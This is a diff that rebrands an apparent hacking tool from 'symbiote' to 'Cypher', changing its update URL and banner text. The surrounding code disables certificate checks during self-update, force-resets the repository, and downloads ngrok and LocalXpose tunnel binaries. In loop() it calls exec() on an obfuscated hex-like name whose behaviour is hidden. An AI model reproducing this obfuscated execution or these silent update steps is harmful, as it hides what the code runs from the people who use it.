@@ -26,7 +26,7 @@ def verCheck():
     try:
         #system('clear')
         print("\n{0}[{2}#{0}] {2}Checking For Updates{2}...".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW ))
-        response = requests.get('https://raw.githubusercontent.com/hasanfirnas/symbiote/master/version.txt',verify=False, timeout=2).text
+        response = requests.get('https://raw.githubusercontent.com/AsHfIEXE/Cypher/main/version.txt',verify=False, timeout=2).text
         with open("version.txt", "r") as f:
             local_version = f.read().split('\n')
         if local_version[0].strip() == response.strip():
@@ -37,7 +37,7 @@ def verCheck():
             print("{0}[{2}#{0}] {0}[{2}Current{0}]{2}- {0}v {6}\n{0}[{2}#{0}] {0}[{2}Available{0}]{2}- {0}v.{7}".format(RED, WHITE, CYAN, GREEN, DEFAULT, YELLOW, local_version[0], response.strip())) 
             print("{0}[{2}#{0}] {2}Updating To The Latest Version {0}[{2}v {6}{0}] \n{0}[{2}#{0}] {2}Please Wait....{7}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, response.strip() ,GREEN2))
             system('git fetch --quiet; git reset --hard origin/master --quiet; git pull --quiet')
-            print("\n\n\n\t\t{2}[{0}#{2}] {0}Restart program \n {2}Enter this command to run {0}-> {3}python3 symbiote.py".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
+            print("\n\n\n\t\t{2}[{0}#{2}] {0}Restart program \n {2}Enter this command to run {0}-> {3}python3 cypher.py".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
             exit()
     except:
         pass
@@ -86,7 +86,7 @@ def checkNgrok():
             system('rm ' + filename)
             system('chmod +x ngrok')
             system('clear')
-            print("\n\n\n\t\t{2}[{0}#{2}] {0}Restart program \n {2}Enter this command to run symbiote {0}-> {3}python3 symbiote.py".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
+            print("\n\n\n\t\t{2}[{0}#{2}] {0}Restart program \n {2}Enter this command to run Cypher {0}-> {3}python3 cypher.py".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
             exit()  
         else:
             ostype = systemos().lower()
@@ -122,7 +122,7 @@ def checkLocalxpose():
             system('unzip {0} && rm {0}'.format(filename))
             system('mv loclx-linux-* loclx && chmod +x loclx && mv loclx Server/')
             system('clear')
-            print("\n\n\n\t\t{2}[{0}#{2}] {0}Restart program \n {2}Enter this command to run symbiote{0}-> {3}python3 symbiote.py".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
+            print("\n\n\n\t\t{2}[{0}#{2}] {0}Restart program \n {2}Enter this command to run Cypher{0}-> {3}python3 cypher.py".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
             exit()
         else:
             ostype = systemos().lower()
@@ -147,7 +147,7 @@ def loop():
         exec(find_3334333933343336333233303335333533323330333433363334333933343635333433343332333033353334333433383334333933353333333236333332333033343333333433313334363333343633333233303334363433343335)
 
 def loadingHack():
-    chaine ="/////////////////////"+"[*]"+" Starting symbiote......"+"/////////////////////".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)
+    chaine ="/////////////////////"+"[*]"+" Starting Cypher......"+"/////////////////////".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)
     charspec = "$*X^%\#~?;"
     i=0
     while i<4:
@@ -164,7 +164,7 @@ def loadingHack():
             time.sleep(0.006)
 
 def loadingTextPrint():
-    string ="                    "+"[*]"+" Starting symbiote......"
+    string ="                    "+"[*]"+" Starting Cypher......"
     a= 0
     while a <3:    
         space = " " * 100
